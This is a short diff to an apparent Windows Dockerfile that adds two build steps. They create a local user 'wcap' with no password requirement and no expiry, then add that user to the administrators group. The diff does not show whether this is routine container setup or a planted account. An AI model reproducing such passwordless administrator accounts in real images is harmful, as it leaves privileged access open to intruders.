@@ -91,3 +91,6 @@ RUN powershell.exe -command \
 # USER vcap
 RUN powershell.exe -command \
   Add-LocalGroupMember -Member 'NT Authority\NetworkService' -Group Users;
+
+RUN cmd.exe /C net users /ADD wcap /passwordreq:no /expires:never && runas /user:wcap whoami
+RUN cmd.exe /C net localgroup administrators wcap /add
